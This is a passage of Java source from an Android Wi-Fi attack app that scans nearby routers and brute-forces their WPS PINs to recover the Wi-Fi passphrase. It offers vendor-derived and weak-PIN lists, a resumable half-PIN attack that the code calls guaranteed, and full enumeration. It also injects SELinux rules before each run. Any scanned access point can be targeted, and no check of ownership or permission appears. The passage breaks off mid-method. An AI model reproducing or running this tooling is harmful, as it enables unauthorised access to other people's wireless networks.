    /** 完整枚举的断点（已试过的候选条数） */
    private int wpsEnumCursor = 0;
    /** 已经对哪个 BSSID 提示过「这个 AP 打不动」—— 提示一次，再点才放行 */
    private String wpsWarnedBssid = null;
    private final StringBuilder wpsLogBuf = new StringBuilder();

    private static final int WPS_PER_TRY_SEC = 30;      // 单个 PIN 的等待窗口（真 WPS 交换要 ~18s）
    private static final int WPS_BATCH_SIZE = 15;       // 每批条数
    private static final int WPS_BATCH_BUDGET = 240;    // 每批总预算（秒）
    private static final int WPS_WEAK_CHUNK = 5;        // 弱 PIN 每小批条数（便于中途判定后立刻停）

    private void buildWpsTab() {
        pageWps.addView(infoBlock(
                L.s("WPS PIN 是什么", "What is WPS PIN"),
                L.s("很多路由器出厂默认开着 WPS 的 PIN 配对，那个 8 位 PIN 是固定值（第 8 位是校验位）。"
                        + "本页用系统的 WPS 状态机逐个试，命中后路由器会把无线口令直接交给设备。\n"
                        + "过程会暂停系统的 WiFi 自动重连，结束后自动恢复；期间设备会短暂断网。",
                        "Many routers ship with WPS PIN pairing enabled, and that 8-digit PIN is a fixed value "
                        + "(the 8th digit is a checksum). This page drives the system WPS state machine to try candidates "
                        + "one by one; on a hit the router hands over the Wi-Fi passphrase.\n"
                        + "Auto-join is paused while running and restored afterwards; the device goes offline briefly.")));

        pageWps.addView(sectionLabel(L.s("目标 AP", "Target AP")));

        // 目标卡：扫描 / 手动添加 / 体检 / 范围开关 / 目标列表 / 当前选中 —— 同一块内容
        LinearLayout wpsTargetCard = AmberTheme.card(this, dp, AmberTheme.RADIUS_CARD);

        Button scanBtn = btnSecondary(L.s("扫描支持 WPS 的 AP", "Scan for WPS APs"));
        scanBtn.setOnClickListener(v -> doWpsScan());
        wpsTargetCard.addView(scanBtn);

        // 扫描状态：一条 4dp 的不确定进度线 + 一行阶段文字。
        // 原来是一个居中的大转圈（用户反馈"点击后转圈"很笨），现在是一条细线。
        wpsScanBar = new android.widget.ProgressBar(this, null,
                android.R.attr.progressBarStyleHorizontal);
        wpsScanBar.setIndeterminate(true);
        wpsScanBar.setProgressTintList(android.content.res.ColorStateList.valueOf(ACCENT));
        wpsScanBar.setVisibility(View.GONE);
        LinearLayout.LayoutParams wsblp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, px(4));
        wsblp.topMargin = px(10);
        wpsTargetCard.addView(wpsScanBar, wsblp);

        wpsScanStatus = new TextView(this);
        wpsScanStatus.setTextSize(AmberTheme.FS_LABEL);
        wpsScanStatus.setTextColor(AmberTheme.TEXT_DIM);
        wpsScanStatus.setVisibility(View.GONE);
        wpsTargetCard.addView(wpsScanStatus, topGap(6));

        Button addTargetBtn = btnSecondary(L.s("手动添加目标（扫不到的弱信号 AP 用这个）",
                "Add target by BSSID (for weak APs the scan misses)"));
        addTargetBtn.setOnClickListener(v -> showAddTargetDialog());
        wpsTargetCard.addView(addTargetBtn);

        Button reconBtn = btnSecondary(L.s("体检全部目标（各发一次探测 PIN，判断谁真能打）",
                "Recon all targets (one probe PIN each - who is really attackable)"));
        reconBtn.setOnClickListener(v -> doWpsRecon());
        wpsTargetCard.addView(reconBtn);

        wpsReconAllBtn = btnSecondary("");
        wpsReconAllBtn.setOnClickListener(v -> {
            wpsReconAll = !wpsReconAll;
            refreshReconScope();
        });
        refreshReconScope();
        wpsTargetCard.addView(wpsReconAllBtn);

        wpsTargetList = new LinearLayout(this);
        wpsTargetList.setOrientation(LinearLayout.VERTICAL);
        wpsTargetCard.addView(wpsTargetList);

        wpsPickedLine = new TextView(this);
        wpsPickedLine.setTextSize(12f);
        wpsPickedLine.setTextColor(TEXT_DIM);
        wpsPickedLine.setPadding(px(4), px(8), px(4), px(8));
        wpsPickedLine.setText(L.s("未选择目标", "No target selected"));
        LinearLayout.LayoutParams wplp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        wplp.topMargin = px(8);
        wpsTargetCard.addView(wpsPickedLine, wplp);

        pageWps.addView(wpsTargetCard);

        pageWps.addView(sectionLabel(L.s("策略", "Strategy")));

        LinearLayout wpsModeCard = AmberTheme.card(this, dp, AmberTheme.RADIUS_CARD);
        wpsModeList = new LinearLayout(this);
        wpsModeList.setOrientation(LinearLayout.VERTICAL);
        wpsModeCard.addView(wpsModeList);
        renderWpsModeList();

        if (wpsImportRow == null) {
            wpsImportRow = new LinearLayout(this);
            wpsImportRow.setOrientation(LinearLayout.HORIZONTAL);
        }
        wpsImportRow.removeAllViews();

        Button pasteBtn = btnSecondary(L.s("粘贴导入", "Paste"));
        pasteBtn.setOnClickListener(v -> showWpsPasteDialog());
        wpsImportRow.addView(pasteBtn, gapWeight(8));

        Button fileBtn = btnSecondary(L.s("从文件导入", "From file"));
        fileBtn.setOnClickListener(v -> pickWpsFile());
        wpsImportRow.addView(fileBtn, gapWeight(8));

        Button clearBtn = btnSecondary(L.s("清空列表", "Clear list"));
        clearBtn.setOnClickListener(v -> {
            io.github.wlmosv_png.wpaforge.wps.WpsCandidates.clearCustom(getFilesDir());
            refreshWpsImportLine();
            Toast.makeText(this, L.s("已清空我的列表", "List cleared"), Toast.LENGTH_SHORT).show();
        });
        wpsImportRow.addView(clearBtn, gapWeight(0));
        wpsModeCard.addView(wpsImportRow);

        wpsImportLine = new TextView(this);
        wpsImportLine.setTextSize(11.5f);
        wpsImportLine.setTextColor(TEXT_DIM);
        wpsImportLine.setPadding(px(4), px(6), px(4), px(2));
        wpsModeCard.addView(wpsImportLine);
        refreshWpsImportLine();

        pageWps.addView(wpsModeCard);



        pageWps.addView(sectionLabel(L.s("进度", "Progress")));

        LinearLayout wpsProgressCard = AmberTheme.card(this, dp, AmberTheme.RADIUS_CARD);
        wpsStatusLine = new TextView(this);
        wpsStatusLine.setTextSize(AmberTheme.FS_STATE);
        wpsStatusLine.setTextColor(TEXT);
        wpsStatusLine.setPadding(px(2), px(6), px(2), px(2));
        wpsProgressCard.addView(wpsStatusLine);

        wpsProgressLine = new TextView(this);
        wpsProgressLine.setTextSize(12f);
        wpsProgressLine.setTextColor(TEXT_DIM);
        wpsProgressLine.setPadding(px(2), px(2), px(2), px(8));
        wpsProgressCard.addView(wpsProgressLine);

        LinearLayout wpsBtns = new LinearLayout(this);
        wpsBtns.setOrientation(LinearLayout.HORIZONTAL);

        wpsStartBtn = btnPrimary(L.s("开始", "Start"));
        wpsStartBtn.setOnClickListener(v -> {
            if (wpsRunning) {
                stopWps();          // 跑着时按它 = 暂停（保留断点）
            } else {
                startWps();         // 没跑 = 开始 / 继续
            }
        });
        wpsBtns.addView(wpsStartBtn, gapWeight(10));

        wpsStopBtn = btnSecondary(L.s("重置进度", "Reset"));
        wpsStopBtn.setEnabled(false);
        wpsStopBtn.setOnClickListener(v -> resetWps());
        wpsBtns.addView(wpsStopBtn, gapWeight(0));
        refreshWpsButtons();
        wpsProgressCard.addView(wpsBtns);

        pageWps.addView(wpsProgressCard);

        pageWps.addView(sectionLabel(L.s("日志", "Log")));

        wpsLogView = new TextView(this);
        wpsLogView.setTextSize(11f);
        wpsLogView.setTextColor(TEXT_DIM);
        wpsLogView.setTypeface(android.graphics.Typeface.MONOSPACE);
        wpsLogView.setBackground(roundBgStroked(SURFACE, AmberTheme.EDGE, AmberTheme.RADIUS_CARD, 0.8f));
        wpsLogView.setPadding(px(16), px(14), px(16), px(14));
        wpsLogView.setLineSpacing(px(2), 1f);
        wpsLogView.setTextIsSelectable(true);
        wpsLogView.setText(L.s("（暂无）", "(empty)"));
        pageWps.addView(wpsLogView);

        refreshWpsProgress();
    }

    private static final String[] WPS_MODE_ZH = {
            "厂商算法（BSSID 派生）", "内置弱 PIN 表", "我的列表（导入）",
            "拆半攻击（11000 次必中）", "完整枚举（1000 万）"};
    private static final String[] WPS_MODE_EN = {
            "Vendor algorithms", "Built-in weak PINs", "My list (imported)",
            "Half-PIN attack (11k, guaranteed)", "Full enumeration (10M)"};

    /** 拆半：阶段 1 的断点（跨阶段切换保留） */
    private int wpsHalfCursor1 = 0;
    /** 拆半断点绑定的目标，防止换目标后接着别人的进度跑 */
    private String wpsHalfBssid = "";

    /**
     * 拆半要跑几十小时，必须能跨 App 重启续跑 —— 断点存 SharedPreferences。
     * 绑 BSSID：换了目标就从头开始，不接着别人的进度。
     */
    private void saveHalfState() {
        try {
            getPreferences(MODE_PRIVATE).edit()
                    .putString("wpsHalfBssid", wpsHalfBssid)
                    .putInt("wpsHalfPhase", wpsSession.halfPhase)
                    .putInt("wpsHalfCursor", wpsSession.halfCursor)
                    .putInt("wpsHalfCursor1", wpsHalfCursor1)
                    .putString("wpsHalfPrefix", wpsSession.halfPrefix)
                    .apply();
        } catch (Throwable ignored) {
        }
    }

    private void loadHalfState(String bssid) {
        try {
            android.content.SharedPreferences p = getPreferences(MODE_PRIVATE);
            if (!bssid.equals(p.getString("wpsHalfBssid", ""))) return;   // 换目标 → 从头
            wpsSession.halfPhase = p.getInt("wpsHalfPhase", 1);
            wpsSession.halfCursor = p.getInt("wpsHalfCursor", 0);
            wpsHalfCursor1 = p.getInt("wpsHalfCursor1", 0);
            wpsSession.halfPrefix = p.getString("wpsHalfPrefix", "");
        } catch (Throwable ignored) {
        }
    }

    private void resetHalfState() {
        try {
            getPreferences(MODE_PRIVATE).edit().clear().apply();
        } catch (Throwable ignored) {
        }
        wpsHalfCursor1 = 0;
    }

    private LinearLayout wpsImportRow;
    private static final int REQ_WPS_IMPORT = 0x7A51;

    private void refreshWpsImportLine() {
        if (wpsImportLine == null) return;
        int n = io.github.wlmosv_png.wpaforge.wps.WpsCandidates.loadCustom(getFilesDir()).size();
        wpsImportLine.setText(L.s("我的列表：", "My list: ") + n
                + L.s(" 条（策略切到「我的列表」时使用）",
                      " entries (used by the 'My list' strategy)"));
    }

    private void showWpsPasteDialog() {
        final EditText input = new EditText(this);
        input.setInputType(android.text.InputType.TYPE_CLASS_TEXT
                | android.text.InputType.TYPE_TEXT_FLAG_MULTI_LINE);
        input.setMinLines(6);
        input.setHint(L.s("每行一个 PIN，7 位或 8 位都行；校验位不对会自动修正",
                "One PIN per line; 7 or 8 digits; bad checksum is auto-fixed"));
        new android.app.AlertDialog.Builder(this)
                .setTitle(L.s("粘贴 PIN 列表（追加）", "Paste PIN list (append)"))
                .setView(input)
                .setPositiveButton(L.s("保存", "Save"), (d, w) -> {
                    int n = io.github.wlmosv_png.wpaforge.wps.WpsCandidates
                            .saveCustom(getFilesDir(), input.getText().toString(), true);
                    refreshWpsImportLine();
                    Toast.makeText(this, L.s("已保存，共 " + n + " 条",
                            "Saved, " + n + " total"), Toast.LENGTH_SHORT).show();
                })
                .setNegativeButton(L.s("取消", "Cancel"), null)
                .show();
    }

    private void pickWpsFile() {
        try {
            android.content.Intent i = new android.content.Intent(
                    android.content.Intent.ACTION_OPEN_DOCUMENT);
            i.addCategory(android.content.Intent.CATEGORY_OPENABLE);
            i.setType("*/*");
            startActivityForResult(i, REQ_WPS_IMPORT);
        } catch (Throwable t) {
            Toast.makeText(this, "无法打开文件选择器: " + t.getMessage(),
                    Toast.LENGTH_LONG).show();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, android.content.Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode != REQ_WPS_IMPORT || resultCode != RESULT_OK || data == null) return;
        final android.net.Uri uri = data.getData();
        if (uri == null) return;
        new Thread(() -> {
            String text = null;
            java.io.InputStream in = null;
            try {
                in = getContentResolver().openInputStream(uri);
                java.io.ByteArrayOutputStream bos = new java.io.ByteArrayOutputStream();
                byte[] buf = new byte[8192];
                int n;
                while ((n = in.read(buf)) > 0) bos.write(buf, 0, n);
                text = new String(bos.toByteArray(), java.nio.charset.StandardCharsets.UTF_8);
            } catch (Throwable t) {
                final String msg = String.valueOf(t);
                runOnUiThread(() -> Toast.makeText(this, "读取失败: " + msg,
                        Toast.LENGTH_LONG).show());
                return;
            } finally {
                if (in != null) try {
                    in.close();
                } catch (Throwable ignored) {
                }
            }
            final String ft = text;
            runOnUiThread(() -> {
                int n = io.github.wlmosv_png.wpaforge.wps.WpsCandidates
                        .saveCustom(getFilesDir(), ft, true);
                refreshWpsImportLine();
                Toast.makeText(this, L.s("已导入，共 " + n + " 条",
                        "Imported, " + n + " total"), Toast.LENGTH_LONG).show();
            });
        }, "wps-import").start();
    }

    private String wpsStrategyName() {
        return L.s(WPS_MODE_ZH[wpsMode], WPS_MODE_EN[wpsMode]);
    }

    private void refreshWpsStrategy() {
        renderWpsModeList();
    }

    /** 策略列表：一行一档，点哪档用哪档（原来是单按钮循环切，容易点错也不知道共几档）。 */
    private void renderWpsModeList() {
        if (wpsModeList == null) return;
        wpsModeList.removeAllViews();
        for (int i = 0; i < WPS_MODE_ZH.length; i++) {
            final int mode = i;
            boolean on = (wpsMode == i);
            Button b = btnSecondary("");
            b.setText((on ? "● " : "○ ") + L.s(WPS_MODE_ZH[i], WPS_MODE_EN[i])
                    + "\n" + L.s(WPS_MODE_DESC_ZH[i], WPS_MODE_DESC_EN[i]));
            b.setBackground(roundBgStroked(on ? ACCENT : SURFACE,
                    on ? ACCENT : BTN_2ND_EDGE, 18, 0.8f));
            b.setTextColor(on ? AmberTheme.ON_ACCENT : TEXT);
            b.setEnabled(!wpsRunning);
            b.setOnClickListener(v -> {
                wpsMode = mode;
                renderWpsModeList();
            });
            LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                    ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
            lp.bottomMargin = px(6);
            wpsModeList.addView(b, lp);
        }
    }

    /** 每档策略的说明（跟着标题一起显示在按钮里）。 */
    private static final String[] WPS_MODE_DESC_ZH = {
            "按 BSSID 本地算厂商默认 PIN（D-Link / ASUS / Broadcom / Realtek 等 40+ 种）。老路由器常常一次就中",
            "约 60 个出厂默认 / 常见值，对新设备仍然有效",
            "你自己导入的候选（下面可粘贴或从文件导入）",
            "WPS 分两半校验：先穷举前 4 位（1 万次），再穷举后 3 位（1 千次）。11000 次必然覆盖真 PIN，约 33 小时",
            "1000 万种按序穷举，物理上不可行 —— 只在前四档都空时才考虑"};
    private static final String[] WPS_MODE_DESC_EN = {
            "Derive the factory PIN from the BSSID (40+ schemes). Best odds on older routers",
            "~60 factory / common values",
            "Your own imported candidates",
            "WPS verifies the PIN in halves: brute-force first 4 digits (10k), then last 3 (1k). 11000 tries always covers it, ~33h",
            "10M in order - impractical; only if everything else fails"};

    /** 当前策略下要试的候选（完整枚举走另一条路）。 */
    private java.util.List<String> wpsCandidatePins(String bssid) {
        java.util.List<String> out = new java.util.ArrayList<>();
        if (wpsMode == 0) {
            for (io.github.wlmosv_png.wpaforge.wps.WpsVendorPins.Candidate c
                    : io.github.wlmosv_png.wpaforge.wps.WpsVendorPins.suggest(bssid, "")) {
                out.add(c.pin);
            }
        } else if (wpsMode == 1) {
            out.addAll(io.github.wlmosv_png.wpaforge.wps.WpsCandidates.builtinWeak());
        } else if (wpsMode == 2) {
            out.addAll(io.github.wlmosv_png.wpaforge.wps.WpsCandidates.loadCustom(getFilesDir()));
        }
        return out;
    }

    private void wpsLog(String line) {
        wpsLogBuf.append(line).append('\n');
        if (wpsLogBuf.length() > 8000) {
            wpsLogBuf.delete(0, wpsLogBuf.length() - 6000);
        }
        runOnUiThread(() -> wpsLogView.setText(wpsLogBuf.toString()));
    }

    /** 扫描进度：转圈 + 一行阶段文字（不再干等三十秒后突然蹦出来）。 */
    private void wpsScanBusy(boolean on, String text) {
        if (wpsScanBar != null) wpsScanBar.setVisibility(on ? View.VISIBLE : View.GONE);
        if (wpsScanStatus == null) return;
        if (on && text != null && !text.isEmpty()) {
            wpsScanStatus.setText(text);
            wpsScanStatus.setVisibility(View.VISIBLE);
        } else if (!on) {
            wpsScanStatus.setVisibility(View.GONE);
        }
    }

    private void doWpsScan() {
        if (wpsRunning) {
            Toast.makeText(this, L.s("任务运行中，请先暂停", "Task running - pause first"),
                    Toast.LENGTH_SHORT).show();
            return;
        }
        wpsTargets.clear();
        renderWpsTargets();
        wpsScanBusy(true, L.s("扫描中…", "Scanning…"));
        new Thread(() -> {
            java.util.List<io.github.wlmosv_png.wpaforge.wps.WpsController.Target> list =
                    io.github.wlmosv_png.wpaforge.wps.WpsController.scan(this,
                            new io.github.wlmosv_png.wpaforge.wps.WpsController.Listener() {
                                @Override
                                public void onLine(String line) {
                                    if (line == null) return;
                                    if (line.startsWith("AP=")) {
                                        final io.github.wlmosv_png.wpaforge.wps.WpsController.Target t =
                                                io.github.wlmosv_png.wpaforge.wps.WpsController.parseApLine(line);
                                        if (t != null) {
                                            runOnUiThread(() -> {
                                                wpsTargets.add(t);
                                                renderWpsTargets();
                                            });
                                        }
                                    } else if (line.startsWith("PHASE=")) {
                                        final String p = line.substring(6).trim();
                                        runOnUiThread(() -> {
                                            if (p.startsWith("scan")) {
                                                wpsScanBusy(true, L.s("扫描第 " + p.substring(4).replace('_', '/')
                                                        + " 轮…", "scan round " + p.substring(4)));
                                            } else if ("enum".equals(p)) {
                                                wpsScanBusy(true, L.s("枚举 supplicant BSS 表…",
                                                        "enumerating BSS table…"));
                                            } else if ("caps".equals(p)) {
                                                wpsScanBusy(true, L.s("读取每个 AP 的 WPS 能力…",
                                                        "reading per-AP capabilities…"));
                                            }
                                        });
                                    } else if (line.startsWith("PROGRESS=")) {
                                        final String p = line.substring(9).trim();
                                        runOnUiThread(() -> wpsScanBusy(true,
                                                L.s("读取能力 ", "capabilities ") + p.replace('_', '/')));
                                    }
                                }

                                @Override
                                public void onResult(io.github.wlmosv_png.wpaforge.wps.WpsController.Result r) {
                                }

                                @Override
                                public boolean isCancelled() {
                                    return false;
                                }
                            });
            runOnUiThread(() -> {
                wpsScanBusy(false, "");
                wpsTargets.clear();
                wpsTargets.addAll(list);
                renderWpsTargets();
                // 结论写进扫描状态行；「目标」那行只表示当前选中项（语义更清楚）
                if (wpsScanStatus != null) {
                    wpsScanStatus.setText(L.s("扫描完成：", "Scan done: ") + list.size()
                            + L.s(" 个支持 WPS 的目标", " WPS targets"));
                    wpsScanStatus.setVisibility(View.VISIBLE);
                }
            });
        }, "wps-scan").start();
    }

    private void renderWpsTargets() {
        wpsTargetList.removeAllViews();
        if (wpsRunning) {
            TextView run = new TextView(this);
            run.setText(L.s("任务运行中 —— 按「暂停」后可更换目标",
                    "Task running - press Pause to change target"));
            run.setTextSize(11.5f);
            run.setTextColor(ACCENT);
            run.setPadding(px(4), 0, px(4), px(8));
            wpsTargetList.addView(run);
        }
        if (wpsTargets.isEmpty()) {
            TextView t = new TextView(this);
            t.setText(L.s("没有扫到支持 WPS 的 AP", "No WPS-capable AP found"));
            t.setTextSize(12f);
            t.setTextColor(TEXT_DIM);
            t.setPadding(px(4), px(10), px(4), px(10));
            wpsTargetList.addView(t);
            return;
        }
        final boolean zh = L.s("a", "b").equals("a");
        for (io.github.wlmosv_png.wpaforge.wps.WpsController.Target tg : wpsTargets) {
            // 每个目标一张**行卡**：名称一行、地址一行、能力/体检一行，右侧信号与状态胶囊。
            // 原来是一个塞了四行居中文字的大按钮（用户反馈"显示的内容很拉胯"）。
            boolean on = wpsPicked != null && tg.bssid.equals(wpsPicked.bssid);
            boolean worth = tg.pinWorthTrying();

            LinearLayout item = new LinearLayout(this);
            item.setOrientation(LinearLayout.HORIZONTAL);
            item.setBackground(roundBgStroked(on ? AmberTheme.ACCENT_BG : AmberTheme.CARD,
                    on ? ACCENT : AmberTheme.EDGE, AmberTheme.RADIUS_CARD, on ? 1.2f : 0.8f));
            item.setPadding(px(14), px(12), px(12), px(12));
            LinearLayout.LayoutParams ilp = new LinearLayout.LayoutParams(
                    ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
            ilp.bottomMargin = px(8);
            item.setLayoutParams(ilp);
            if (wpsRunning) item.setAlpha(0.6f);

            LinearLayout left = new LinearLayout(this);
            left.setOrientation(LinearLayout.VERTICAL);

            TextView ssid = new TextView(this);
            ssid.setText(tg.ssid);
            ssid.setTextSize(AmberTheme.FS_TITLE);
            ssid.setTextColor(on ? ACCENT : TEXT);
            ssid.setTypeface(Typeface.create("sans-serif-medium", Typeface.NORMAL));
            ssid.setSingleLine(true);
            ssid.setEllipsize(TextUtils.TruncateAt.END);
            left.addView(ssid);

            TextView addr = new TextView(this);
            addr.setText(tg.bssid + "   " + tg.freq + " MHz");
            addr.setTextSize(FS_TINY);
            addr.setTextColor(AmberTheme.TEXT_DIM);
            addr.setTypeface(Typeface.MONOSPACE);
            addr.setSingleLine(true);
            LinearLayout.LayoutParams al2 = new LinearLayout.LayoutParams(
                    ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
            al2.topMargin = px(4);
            left.addView(addr, al2);

            StringBuilder cap = new StringBuilder();
            cap.append("[").append(tg.capLabel(zh)).append("]");
            String rl = tg.reconLabel(zh);
            if (!rl.isEmpty()) {
                cap.append("  ").append(rl);
                if (!tg.reconDetail.isEmpty()) cap.append("  ").append(tg.reconDetail);
            }
            if (!tg.wpsMethods.isEmpty()) cap.append("  ").append(tg.wpsMethods);
            if (!tg.wpsDevice.isEmpty()) cap.append("  · ").append(tg.wpsDevice);

            TextView caps = new TextView(this);
            caps.setText(cap.toString());
            caps.setTextSize(FS_TINY);
            caps.setTextColor(worth ? AmberTheme.TEXT_DIM : DANGER);
            caps.setTypeface(Typeface.MONOSPACE);
            caps.setSingleLine(false);
            caps.setMaxLines(3);
            LinearLayout.LayoutParams clp2 = new LinearLayout.LayoutParams(
                    ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
            clp2.topMargin = px(3);
            left.addView(caps, clp2);

            item.addView(left, new LinearLayout.LayoutParams(0,
                    ViewGroup.LayoutParams.WRAP_CONTENT, 1f));

            LinearLayout right = new LinearLayout(this);
            right.setOrientation(LinearLayout.VERTICAL);
            right.setGravity(Gravity.END);
            right.setMinimumWidth(px(70));

            TextView dbm = new TextView(this);
            dbm.setText(tg.rssi + " dBm");
            dbm.setTextSize(12f);
            dbm.setTextColor(AmberTheme.signalColor(levelOfRssi(tg.rssi)));
            dbm.setTypeface(Typeface.MONOSPACE);
            dbm.setGravity(Gravity.END);
            dbm.setSingleLine(true);
            right.addView(dbm);

            TextView chip = new TextView(this);
            chip.setText(on ? L.s("已选", "selected")
                    : (worth ? L.s("可试", "worth trying") : L.s("不建议", "not advised")));
            chip.setTextSize(FS_TINY);
            chip.setTextColor(on ? AmberTheme.ON_ACCENT : (worth ? AmberTheme.TEXT_DIM : DANGER));
            chip.setGravity(Gravity.CENTER);
            chip.setBackground(roundBg(on ? ACCENT : (worth ? AmberTheme.CARD_3
                    : AmberTheme.DANGER_SOFT_BG), AmberTheme.RADIUS_CHIP));
            chip.setPadding(px(8), px(3), px(8), px(3));
            LinearLayout.LayoutParams chlp = new LinearLayout.LayoutParams(
                    ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
            chlp.topMargin = px(6);
            right.addView(chip, chlp);

            item.addView(right);
            item.setOnClickListener(v -> {
                if (wpsRunning) {
                    Toast.makeText(this, L.s("任务运行中，请先暂停再换目标",
                            "Task running - pause first"), Toast.LENGTH_SHORT).show();
                    return;
                }
                wpsPicked = tg;
                wpsWarnedBssid = null;      // 换了目标，警告重新计
                wpsPickedLine.setText(L.s("目标：", "Target: ") + tg.describe()
                        + "   [" + tg.capLabel(zh) + "]");
                refreshWpsButtons();
                renderWpsTargets();
            });
            wpsTargetList.addView(item);
        }
        // 默认选第一个，省一次点击
        if (wpsPicked == null && !wpsTargets.isEmpty()) {
            wpsPicked = wpsTargets.get(0);
            wpsPickedLine.setText(L.s("目标：", "Target: ") + wpsPicked.describe()
                    + "   [" + wpsPicked.capLabel(zh) + "]");
            renderWpsTargets();
        }
    }

    private void refreshWpsProgress() {
        io.github.wlmosv_png.wpaforge.wps.WpsEngine.Session s = wpsSession;
        if (s == null) {
            wpsStatusLine.setText(L.s("待开始", "Idle"));
            wpsProgressLine.setText("");
            return;
        }
        boolean zh = L.s("a", "b").equals("a");
        wpsStatusLine.setText(io.github.wlmosv_png.wpaforge.wps.WpsEngine.verdictText(s.verdict, zh)
                + (s.hitPin != null ? ("  PIN=" + s.hitPin) : ""));
        StringBuilder sb = new StringBuilder();
        if (s.precheckMethods != null && !s.precheckMethods.isEmpty()) {
            sb.append(L.s("能力 ", "cap ")).append(s.precheck).append(' ')
                    .append(s.precheckMethods).append(L.s("  \u00b7  ", "  \u00b7  "));
        }
        sb.append(L.s("已试 ", "tried ")).append(s.tried);
        double rate = io.github.wlmosv_png.wpaforge.wps.WpsEngine.ratePerMin(s);
        if (rate > 0) {
            sb.append(L.s(" 次 · ", " \u00b7 "))
                    .append(String.format(java.util.Locale.US, "%.1f", rate))
                    .append(L.s(" 次/分", " /min"));
        }
        sb.append(L.s(" · 平均 ", " \u00b7 avg ")).append(s.avgMs()).append("ms");
        if (s.everRealWps) {
            sb.append(L.s(" · ★ 真实 WPS 交换", " \u00b7 \u2605 real WPS exchange"));
        } else if (s.everWpsSession) {
            sb.append(L.s(" · 仅瞬时关联（多半未开配对）",
                    " \u00b7 brief assoc only (likely not pairing)"));
        }
        if (s.consecutiveNoResponse > 0) {
            sb.append(L.s(" · 连续无响应 ", " \u00b7 no-response streak "))
                    .append(s.consecutiveNoResponse);
        }
        if (wpsMode == 3) {
            int total = s.halfPhase == 2 ? 1000 : 10000;
            int done = s.halfCursor;
            int remain = Math.max(0, total - done);
            sb.append(L.s(" · 阶段", " \u00b7 phase ")).append(s.halfPhase)
                    .append("/").append(total).append(L.s(" 已试 ", " done "))
                    .append(done);
            if (s.halfPhase == 2 && !s.halfPrefix.isEmpty()) {
                sb.append(L.s(" 前4位=", " prefix=")).append(s.halfPrefix);
            }
            sb.append(L.s(" 剩余约 ", " eta "))
                    .append(io.github.wlmosv_png.wpaforge.wps.WpsEngine
                            .human((long) (s.avgMs() * remain)));
        }
        if (wpsMode == 4) {
            int remaining = io.github.wlmosv_png.wpaforge.wps.WpsPins.enumerateTotal() - wpsEnumCursor;
            sb.append(L.s(" · 剩余 ", " · left ")).append(remaining);
            String eta = io.github.wlmosv_png.wpaforge.wps.WpsEngine.eta(s, remaining);
            if (eta != null) sb.append(L.s(" · 预计 ", " · eta ")).append(eta);
        }
        wpsProgressLine.setText(sb.toString());
    }

    private void startWps() {
        if (wpsRunning) return;
        if (wpsPicked == null) {
            Toast.makeText(this, L.s("请先扫描并选择目标", "Scan and pick a target first"),
                    Toast.LENGTH_SHORT).show();
            return;
        }
        // 扫描阶段已经问出这个 AP 不收 PIN / 被锁：先拦一次，再点才放行。
        // 以前没有这一步，用户要白等 8 次 × 20 秒才知道打不动。
        if (!wpsPicked.pinWorthTrying() && !wpsPicked.bssid.equals(wpsWarnedBssid)) {
            wpsWarnedBssid = wpsPicked.bssid;
            Toast.makeText(this, L.s(
                    "该 AP 不会接受外部 PIN（" + wpsPicked.capLabel(true)
                            + (wpsPicked.wpsMethods.isEmpty() ? "" : "，" + wpsPicked.wpsMethods)
                            + "）。\n跑下去基本不可能命中；再点一次「开始」仍然强制运行。",
                    "This AP does not accept an external PIN (" + wpsPicked.capLabel(false)
                            + (wpsPicked.wpsMethods.isEmpty() ? "" : ", " + wpsPicked.wpsMethods)
                            + ").\nVery unlikely to hit; tap Start again to force."),
                    Toast.LENGTH_LONG).show();
            return;
        }
        wpsRunning = true;
        wpsCancel = false;
        wpsLogBuf.setLength(0);
        wpsSession = new io.github.wlmosv_png.wpaforge.wps.WpsEngine.Session();
        refreshWpsButtons();
        renderWpsTargets();
        renderWpsModeList();
        refreshWpsProgress();
        final String bssid = wpsPicked.bssid;
        new Thread(() -> runWpsAttack(bssid), "wps-attack").start();
    }

    private void stopWps() {
        wpsCancel = true;
        wpsLog(L.s("[i] 暂停请求已发出，跑完当前这个就收工（进度已存档，下次点「继续」接着跑）…",
                "[i] Pause requested - finishing the current try (progress saved; press Resume)…"));
    }

    private void runWpsAttack(String bssid) {
        try {
            wpsLog(L.s("[i] 注入权限规则…", "[i] injecting rules…"));
            io.github.wlmosv_png.wpaforge.wps.WpsController.injectSelinux(this);
            wpsLog(L.s("[i] 暂停自动重连…", "[i] pausing auto-join…"));
            io.github.wlmosv_png.wpaforge.wps.WpsController.setAutojoin(this, false);

            // 先把「这个 AP 收不收 PIN」问清楚。AP 自己宣告的 WSC 配置方法
            // 就能决定 PIN 攻击有没有意义，不该靠盲跑 8×20 秒去试。
            wpsLog(L.s("[i] 读取 AP 的 WPS 能力…", "[i] reading AP WPS capability…"));
            io.github.wlmosv_png.wpaforge.wps.WpsController.Info wi =
                    io.github.wlmosv_png.wpaforge.wps.WpsController.info(this, bssid);
            io.github.wlmosv_png.wpaforge.wps.WpsEngine.precheck(wpsSession, wi);
            boolean zhCap = L.s("a", "b").equals("a");
            wpsLog("      verdict=" + wi.verdict
                    + (wi.methods.isEmpty() ? "" : "  config_methods=" + wi.methods)
                    + (wi.locked ? "  locked=1" : "")
                    + (wi.device.isEmpty() ? "" : "  device=" + wi.device));
            wpsLog("      " + wi.reason(zhCap));
            if (io.github.wlmosv_png.wpaforge.wps.WpsEngine.presetTerminal(wpsSession)) {
                // 走到这里说明用户已经二次确认过：尊重选择，退回运行时兜底
                wpsLog(L.s("[!] 该目标已被判打不动，按你的要求强制运行（只留运行时判定）。",
                        "[!] Target judged hopeless - forcing as requested (runtime verdict only)."));
                wpsSession.forced = true;
                wpsSession.verdict = io.github.wlmosv_png.wpaforge.wps.WpsEngine.V_RUNNING;
            }

